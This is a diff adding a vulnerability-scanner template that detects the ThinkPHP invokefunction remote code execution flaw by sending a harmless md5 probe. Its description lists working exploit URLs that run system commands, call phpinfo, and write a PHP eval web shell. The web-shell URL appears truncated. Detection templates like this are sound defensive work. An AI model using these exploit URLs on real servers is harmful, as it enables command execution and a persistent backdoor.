@@ -1,0 +1,31 @@
+id: thinkphp_invoke_func_code_exec
+
+info:
+  name: "ThinkPHP InvokeFunction 远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    ThinkPHP框架的/index.php接口存在远程代码执行漏洞，攻击者可通过构造特定请求路径和参数利用该漏洞。
+      
+      漏洞利用示例：
+      http://域名/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+      
+      http://域名/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
+      
+      http://域名/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3C%3Fphp%20eval(%24_REQUEST%5B6%5D)%3B%3F%3
+      
+  tags: thinkphp
+
+http:
+- raw:
+  - |
+    GET /index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=2333 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - '56540676'
